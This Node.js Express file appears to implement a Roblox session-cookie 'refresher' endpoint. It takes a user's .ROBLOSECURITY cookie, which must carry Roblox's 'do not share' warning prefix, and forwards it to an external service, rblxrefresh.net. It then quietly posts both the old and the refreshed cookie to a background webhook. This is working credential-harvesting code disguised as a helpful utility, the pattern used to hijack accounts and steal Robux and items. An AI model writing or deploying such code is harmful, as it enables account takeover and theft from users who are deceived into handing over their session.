const express = require('express');
const axios = require('axios');

const app = express();

const RBLX_REFRESH_API_URL = "https://rblxrefresh.net/refresh";
const REQUIRED_COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|";

app.get('/api/refresh', async (req, res) => {
    const oldCookie = req.query.cookie;

    // 1. Validate input
    if (!oldCookie) {
        return res.status(400).json({ error: "Cookie parameter is missing." });
    }
    if (!oldCookie.startsWith(REQUIRED_COOKIE_PREFIX)) {
        return res.status(400).json({ error: "Invalid cookie format. It must start with the full _WARNING... prefix." });
    }

    try {
        // 2. Call the external rblxrefresh.net API
        console.log("DIAGNOSIS: Calling rblxrefresh.net API...");
        const apiResponse = await axios.post(RBLX_REFRESH_API_URL, {
            cookie: oldCookie
        }, {
            headers: { 'Content-Type': 'application/json' }
        });

        const refreshedCookie = apiResponse.data?.refreshedCookie;

        // 3. Validate the API response
        if (!refreshedCookie) {
            console.error("DIAGNOSIS: rblxrefresh.net API responded without a refreshedCookie.", apiResponse.data);
            const errorMessage = apiResponse.data?.message || "The API did not return a new cookie.";
            throw new Error(errorMessage);
        }
        console.log("DIAGNOSIS: Successfully got new cookie from API.");

        // 4. Respond to the user immediately
        res.status(200).json({ refreshedCookie });
        console.log("DIAGNOSIS: Sent new cookie to user.");

        // 5. Trigger our webhook endpoint in the background
        const internalApiUrl = `https://${req.headers.host}/api/webhook`;
        axios.post(internalApiUrl, { refreshedCookie, oldCookie })
            .then(() => console.log("DIAGNOSIS: Successfully triggered webhook."))
            .catch(err => console.error("DIAGNOSIS: FAILED to trigger webhook.", err.message));

    } catch (error) {
        // This catches errors from the axios call itself (e.g., rblxrefresh is down)
        // or the validation error we threw.
        const errorMessage = error.response?.data?.message || error.message;
        console.error("DIAGNOSIS: An error occurred in the refresh process.", errorMessage);
        res.status(500).json({ error: `Refresh failed: ${errorMessage}` });
    }
});

module.exports = app;
